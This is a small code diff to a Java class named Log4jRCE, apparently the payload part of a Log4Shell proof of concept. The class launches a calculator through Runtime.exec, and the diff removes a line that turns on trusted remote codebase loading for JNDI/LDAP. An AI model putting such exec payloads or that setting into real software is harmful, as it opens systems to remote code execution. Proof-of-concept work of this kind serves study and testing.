@@ -11,7 +11,6 @@ public class Log4jRCE {
           String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                          ? new String[]{"cmd.exe","/c", "calc.exe"}
                          : new String[]{"open","/System/Applications/Calculator.app"};
-            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
             p = java.lang.Runtime.getRuntime().exec(cmds);
             InputStream fis = p.getInputStream();
             InputStreamReader isr = new InputStreamReader(fis);    
